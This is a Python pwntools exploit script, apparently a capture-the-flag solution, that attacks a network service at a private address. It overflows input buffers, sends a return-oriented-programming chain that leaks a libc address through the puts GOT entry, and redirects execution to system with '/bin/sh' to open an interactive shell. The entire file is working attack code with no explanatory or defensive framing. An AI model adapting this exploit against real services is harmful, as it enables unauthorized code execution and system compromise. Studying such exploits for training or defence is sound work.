#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 4869

r = remote(host,port)

r.recvuntil(":")
r.sendline("a"*0x40)
r.recvuntil(":")
r.sendline("a"*0x40)

r.recvuntil(":")
r.sendline("\x00"*0x10)
r.recvuntil(":")
r.sendline("a"*0x10)

pop_rsi_r15 = 0x0000000000400a21
puts = 0x400650
read_input = 0x00000000004007c7
pop_rdi = 0x0000000000400a23
puts_got = 0x000000000600e88
context.arch = "amd64"
rop = flat([pop_rdi,puts_got,puts,pop_rdi,puts_got,pop_rsi_r15,0x11,0,read_input,pop_rdi,puts_got+8,puts])
r.recvuntil(":")
r.send("a"*8 + p64(pop_rsi_r15^0x00000000004009b4^0x6161616161616161) + rop.ljust(0x70,"B"))
r.recvuntil(":")
r.send(("a"*0x8 + p64(0x6161616161616161)).ljust(128,"a"))
r.recvuntil("Result:")
data = r.recvuntil("\n")[:-1].ljust(8,"\x00")
libc = u64(data) - 0x6f690
system = libc + 0x45390
r.sendline(p64(system) + "/bin/sh\x00")


r.interactive()
